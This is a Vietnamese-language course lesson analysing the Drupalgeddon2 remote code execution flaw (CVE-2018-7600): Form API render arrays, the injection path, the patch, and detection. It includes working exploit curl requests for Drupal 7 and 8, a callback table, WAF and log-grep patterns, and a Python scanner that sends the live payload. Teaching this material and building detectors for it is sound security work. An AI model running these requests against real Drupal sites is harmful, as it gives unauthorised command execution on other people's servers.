---
title: "12. Drupalgeddon2 Part 1 — Form API & Vulnerability Class"
tags: [security, cve, landmark-cves, drupal, drupalgeddon2, form-api, php, rce, lesson-12]
aliases: [Drupalgeddon2 Part 1, CVE-2018-7600]
created: 2026-03-24
---

> **Prerequisites**: [[11-apache-struts-ognl|11. Apache Struts OGNL]], PHP cơ bản (arrays, callbacks), HTTP POST/AJAX
> **Objectives**:
> - Hiểu Drupal Form API và Render Array — cấu trúc dữ liệu trung tâm của Drupal
> - Phân tích tại sao `#` properties trong render array có thể là callable PHP functions
> - Hiểu tại sao AJAX endpoint `/user/register` nhận render array từ POST data
> - Trace call chain: POST request → `element_parents` → Form cache bypass → render callback → RCE
> - Phân biệt Drupal 7 và Drupal 8 exploit paths
> - Hiểu patch: `RequestSanitizer::stripDangerousValues()` — tại sao strip `#` là đủ
> - Nắm được tại sao lỗi này có mặt trong tất cả Drupal subsystem

---

## Bối cảnh: CMS Phổ Biến Thứ 2 Thế Giới

Ngày 28/3/2018, Drupal Security Team phát hành SA-CORE-2018-002 với cảnh báo "Highly Critical" — mức cao nhất trong thang của Drupal. Lỗ hổng ảnh hưởng tất cả phiên bản Drupal 6, 7, và 8 với cấu hình mặc định.

Drupal được dùng bởi hơn 1 triệu websites, bao gồm nhiều tổ chức chính phủ, trường đại học, và doanh nghiệp lớn. Trong vòng 24 giờ sau khi PoC được công bố ngày 12/4/2018 (2 tuần sau patch), botnet bắt đầu mass-exploit để cài cryptominer và backdoor.

Tên "Drupalgeddon2" là cái tên cộng đồng tặng — lấy cảm hứng từ "Drupalgeddon" (SA-CORE-2014-005, CVE-2014-3704), một lỗi SQL injection nghiêm trọng trước đó. Cái đuôi "2" hàm ý: lại một thảm họa Drupal nữa.

---

## Drupal Form API — Nền Tảng Cần Hiểu

### Render Array là gì?

Drupal xây dựng toàn bộ giao diện (trang, form, block, node) thông qua **Render Array** — một PHP associative array mô tả cấu trúc UI. Đây là abstraction layer giữa logic và presentation:

```php
// Ví dụ render array đơn giản — một text field
$element = [
    '#type'          => 'textfield',
    '#title'         => t('Your Name'),
    '#default_value' => '',
    '#required'      => TRUE,
    '#maxlength'     => 64,
];

// Render array cho một markup element
$element = [
    '#type'   => 'markup',
    '#markup' => '<p>Hello World</p>',
];
```

Properties bắt đầu bằng `#` là **Render System properties** — chúng điều khiển cách element được render, validate, và process.

### Properties nguy hiểm — Callback-based

Một số `#` properties trong Drupal Form API nhận **PHP callable** (function name, array `[class, method]`, closure) làm giá trị:

```php
// Drupal Form API — các property dạng callback
$element = [
    '#type'         => 'markup',
    '#markup'       => 'output content here',

    // Các property sau đây nhận PHP callable:
    '#pre_render'   => ['some_function'],       // gọi trước khi render
    '#post_render'  => ['some_function'],       // gọi sau khi render
    '#lazy_builder' => ['callback', [args]],    // lazy rendering
    '#access_callback' => 'some_function',      // check access
    '#element_validate' => ['validate_fn'],     // validation callback
];
```

Khi Drupal render element này, nó gọi các callable đó với element data. Ví dụ với `#post_render`:

```php
// Drupal render system — simplified
function drupal_render(&$element) {
    // ... render element ...
    $children = '';
    foreach ($element['#children'] as $key => $child) {
        $children .= drupal_render($child);
    }
    $element['#markup'] = $children;

    // Gọi #post_render callbacks
    if (!empty($element['#post_render'])) {
        foreach ($element['#post_render'] as $callback) {
            // ← Nếu $callback là 'exec' và $element['#markup'] là user input → RCE
            $element['#markup'] = call_user_func($callback,
                                                 $element['#markup'],
                                                 $element);
        }
    }
    return $element['#markup'];
}
```

> [!definition] Definition 12.1 — Drupal Render Callback Security Model
> Drupal Form API được thiết kế để chỉ cho phép **trusted PHP callables** trong `#pre_render`, `#post_render`, v.v. — những function được developer định nghĩa trong code, không phải input từ người dùng. Bảo mật dựa vào assumption: user không thể inject vào cấu trúc render array.
>
> CVE-2018-7600 phá vỡ assumption này bằng cách inject `#post_render`, `#lazy_builder` qua HTTP POST parameters — Drupal không validate rằng `#` properties từ user input không được phép.

---

## AJAX Request Processing — Entry Point

### `/user/register` AJAX endpoint

Drupal có AJAX API để xử lý form submission không cần reload trang. Khi form submit qua AJAX, URL dạng:

```text
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
```

Tham số quan trọng:
- `element_parents`: đường dẫn đến element trong form tree cần update
- `ajax_form=1`: trigger AJAX processing path
- `_wrapper_format=drupal_ajax`: format response

### Form caching mechanism

Khi Drupal xử lý AJAX request:

```text
1. Client gửi POST với form_id và form_build_id
2. Drupal load form từ cache (form_cache table trong DB)
3. Merge POST data vào form array
4. Re-render element được chỉ định bởi element_parents
5. Trả về JSON với rendered HTML
```

**Vấn đề**: ở bước 3, POST data được merge vào form array mà không strip `#` properties. Attacker có thể inject properties như `#post_render` trực tiếp vào form element.

---

## Exploit Mechanism — Drupal 8

### Request structure

```http
POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
Host: victim.com
Content-Type: application/x-www-form-urlencoded

form_id=user_register_form&_drupal_ajax=1&
mail[a][#post_render][]=exec&
mail[a][#type]=markup&
mail[a][#markup]=id
```

Phân tích từng phần:

```text
element_parents=account/mail/#value
  → Drupal sẽ render element tại path: account → mail → #value trong form tree

mail[a][#post_render][]=exec
  → PHP array: $form['mail']['a']['#post_render'] = ['exec']
  → Sau khi render, Drupal gọi exec($element['#markup'])

mail[a][#type]=markup
  → Element type: markup (render trực tiếp #markup content)

mail[a][#markup]=id
  → Giá trị sẽ được pass vào exec() → thực thi command "id"
```

### Tại sao `exec()` work?

PHP `exec(command)` execute OS command và trả về output string. Khi Drupal gọi:

```php
call_user_func('exec', 'id', $element);
// tương đương: exec('id', $element) → trả về output của "id"
```

Output được nhúng vào render result và gửi về trong AJAX JSON response.

### Response từ server vulnerable

```json
[
  {
    "command": "insert",
    "method": "replaceWith",
    "selector": null,
    "data": "uid=33(www-data) gid=33(www-data) groups=33(www-data)<span class=\"ajax-new-content\"></span>",
    "settings": null
  }
]
```

Output của command `id` được nhúng trực tiếp vào AJAX response — **in-band command output**!

---

## Drupal 7 vs Drupal 8 — Hai Exploit Path

Drupal 7 và Drupal 8 có kiến trúc Form API khác nhau → exploit path khác nhau:

### Drupal 8 — `#post_render` via `/user/register`

```bash
curl -X POST \
  'http://target/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  -d 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=id'
```

### Drupal 8 — `#lazy_builder` (blind, dùng khi `#post_render` không trả output)

```bash
curl -X POST \
  'http://target/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  -d 'form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=touch+/tmp/pwned'
```

Response sẽ là HTTP 500 (error), nhưng command vẫn executed. Verify bằng file creation.

### Drupal 7 — `#post_render` via `/user/password`

Drupal 7 dùng `#post_render` nhưng qua endpoint khác và element path khác:

```bash
curl -X POST \
  'http://target/user/password?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  -d 'form_id=user_pass&_drupal_ajax=1&name[#post_render][]=passthru&name[#type]=markup&name[#markup]=id'
```

### Callback functions thường dùng

| Function | Effect | Output |
|---------|--------|--------|
| `exec` | Execute command, return output | Cuối output (string) |
| `passthru` | Execute command, print output | Direct stdout |
| `system` | Execute command, print + return | Direct stdout |
| `shell_exec` | Execute command via shell | Full output (string) |
| `phpinfo` | PHP info | HTML page |
| `phpversion` | PHP version | String |

---

## Source Code Analysis — Drupal Form Processing

### Drupal 8 Form build/submission path

```php
// core/lib/Drupal/Core/Form/FormBuilder.php (simplified, vulnerable version)
public function buildForm($form_id, FormStateInterface &$form_state) {
    // ... build form array ...
    
    // AJAX path: load từ cache và merge user input
    if ($this->requestStack->getCurrentRequest()->request->has('form_build_id')) {
        $form = $this->getCache($form_build_id, $form_state);
        
        // BUG: processInput merge POST data vào form array
        // bao gồm cả các key bắt đầu bằng '#'
        $this->processInput($form, $form_state);
        //    ↑ không strip '#' properties từ user POST data
    }
    
    return $form;
}

// core/lib/Drupal/Core/Form/FormBuilder.php
protected function processInput(&$element, FormStateInterface $form_state) {
    foreach ($element as $key => &$child) {
        if (is_array($child)) {
            // Recursively process children
            // BUG: $key có thể là '#post_render', '#lazy_builder', etc.
            // từ user POST data — không có whitelist check
            $this->processInput($child, $form_state);
        }
    }
}
```

### Drupal render engine — thực thi callback

```php
// core/lib/Drupal/Core/Render/Renderer.php (simplified)
protected function doRender(&$element, $is_root_call = FALSE) {
    // ...
    
    // Execute #post_render callbacks
    if (!empty($element['#post_render'])) {
        foreach ($element['#post_render'] as $callable) {
            // ← Nếu $callable = 'exec' và $element['#children'] = 'id'
            //   thì đây chính xác là: exec('id')
            $element['#children'] = call_user_func(
                $callable,
                $element['#children'],
                $element
            );
        }
    }
    
    // Execute #lazy_builder
    if (!empty($element['#lazy_builder'])) {
        [$callback, $args] = $element['#lazy_builder'];
        // call_user_func_array('exec', ['id']) → exec('id')
        $element = call_user_func_array($callback, $args);
    }
    
    return $element;
}
```

---

## Patch Analysis — `RequestSanitizer`

Patch của Drupal (SA-CORE-2018-002) thêm class `RequestSanitizer` vào bootstrap:

```php
// core/lib/Drupal/Core/Security/RequestSanitizer.php (patch)
class RequestSanitizer {

    public static function sanitize(Request $request, $whitelist, $log_sanitized_keys) {
        $get_sanitized  = static::stripDangerousValues($request->query->all(),   $whitelist, $sanitized_keys);
        $post_sanitized = static::stripDangerousValues($request->request->all(), $whitelist, $sanitized_keys);
        $cookie_sanitized = static::stripDangerousValues($request->cookies->all(), $whitelist, $sanitized_keys);
        // Update request với sanitized data
        // ...
    }

    protected static function stripDangerousValues($input, $whitelist, &$sanitized_keys) {
        if (is_array($input)) {
            foreach ($input as $key => $value) {
                if ($key !== '' && $key[0] === '#') {
                    // ← KEY FIX: strip bất kỳ key nào bắt đầu bằng '#'
                    // từ $_GET, $_POST, $_COOKIE
                    unset($input[$key]);
                    $sanitized_keys[] = $key;
                } elseif (is_array($value)) {
                    $input[$key] = static::stripDangerousValues($value, $whitelist, $sanitized_keys);
                }
            }
        }
        return $input;
    }
}
```

Patch đơn giản nhưng hiệu quả: **strip tất cả array keys bắt đầu bằng `#`** từ user input trước khi merge vào form array. Điều này ngăn user inject `#post_render`, `#lazy_builder`, hay bất kỳ Form API property nào khác.

> [!definition] Definition 12.2 — Root Cause và Fix
> Root cause: Drupal merge user-supplied HTTP parameters vào Form API render array mà không kiểm tra xem keys có bắt đầu bằng `#` không. `#` là dấu hiệu của Drupal control properties — chúng không nên đến từ user input.
>
> Fix: `RequestSanitizer::stripDangerousValues()` strip tất cả `#`-prefixed keys từ toàn bộ input (GET, POST, Cookie) ở giai đoạn bootstrap — trước khi bất kỳ form processing nào xảy ra.

---

## Detection Pattern

### HTTP Request indicators

```text
URL pattern:
  ?element_parents=...&ajax_form=1&_wrapper_format=drupal_ajax

POST body indicators:
  [#post_render]  hoặc  [#lazy_builder]  hoặc  [#pre_render]
  Chứa PHP function names: exec, system, passthru, shell_exec, phpinfo

WAF pattern:
  POST.*\[#(post_render|lazy_builder|pre_render|access_callback)\]
```

### Log detection (Apache/Nginx)

```bash
grep -E '\[#(post_render|lazy_builder|pre_render)\]' /var/log/apache2/access.log
grep -E 'element_parents.*ajax_form' /var/log/nginx/access.log
```

### Python scanner

```python
import requests

def check_drupalgeddon2(target):
    """
    Kiểm tra nhanh xem target có vulnerable không.
    Dùng safe command 'echo DRUPALVULNCHECK' để test.
    """
    url = target.rstrip('/') + (
        "/user/register"
        "?element_parents=account/mail/%23value"
        "&ajax_form=1"
        "&_wrapper_format=drupal_ajax"
    )
    data = {
        "form_id":      "user_register_form",
        "_drupal_ajax": "1",
        "mail[a][#post_render][]": "exec",
        "mail[a][#type]":          "markup",
        "mail[a][#markup]":        "echo DRUPALVULNCHECK",
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent":   "Mozilla/5.0",
    }
    try:
        resp = requests.post(url, data=data, headers=headers, timeout=8, verify=False)
        if "DRUPALVULNCHECK" in resp.text:
            print(f"[+] VULNERABLE to Drupalgeddon2!")
            print(f"    Endpoint: {url}")
            return True
        elif resp.status_code == 403:
            print(f"[-] 403 Forbidden — possibly patched or WAF blocking")
        elif resp.status_code == 404:
            print(f"[-] 404 — endpoint not found, different Drupal path?")
        else:
            print(f"[-] Not vulnerable — response {resp.status_code}")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

check_drupalgeddon2("http://localhost:8081")
```

---

## Affected Versions và Severity

| Drupal version | Vulnerable? | Fix version |
|---------------|------------|-------------|
| 6.x (EOL) | Có | Không có official patch — upgrade |
| 7.x < 7.58 | Có | 7.58 |
| 8.3.x < 8.3.9 | Có | 8.3.9 |
| 8.4.x < 8.4.6 | Có | 8.4.6 |
| 8.5.x < 8.5.1 | Có | 8.5.1 |

NIST CVSS: **9.8 Critical** — no auth, no interaction, unauthenticated RCE với default config.

---

## Summary

- Drupal Form API dùng `#` properties trong render array để điều khiển rendering — bao gồm callback functions (`#post_render`, `#lazy_builder`)
- AJAX form processing merge POST data vào form array mà không strip `#`-prefixed keys → attacker inject callable PHP functions như `exec`, `system`
- Khi Drupal render element, nó gọi `call_user_func(#post_render[0], markup, element)` → `exec(attacker_command)`
- Drupal 8: exploit qua `/user/register` AJAX endpoint; Drupal 7: qua `/user/password`
- Output in-band: command output được nhúng vào AJAX JSON response
- Patch: `RequestSanitizer::stripDangerousValues()` — strip `#`-prefixed keys từ tất cả user input
- [[13-drupalgeddon2-exploit-chain|Bài tiếp theo]]: exploit chain đầy đủ, reverse shell, file upload webshell, bypass techniques

---

## References

- Drupal Security Advisory SA-CORE-2018-002: https://www.drupal.org/sa-core-2018-002
- Unit 42 exploit analysis: https://unit42.paloaltonetworks.com/unit42-exploit-wild-drupalgeddon2-analysis-cve-2018-7600/
- Drupal patch diff (RequestSanitizer): https://cgit.drupalcode.org/drupal/commit/?h=8.5.x&id=9b5b4d
- Metasploit module: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/drupal_drupalgeddon2.rb
- exploit-db #44448 (Python PoC): https://www.exploit-db.com/exploits/44448
- SecurityJourney writeup: https://www.securityjourney.com/post/drupalgeddon2-cve-2018-7600-vulnerability
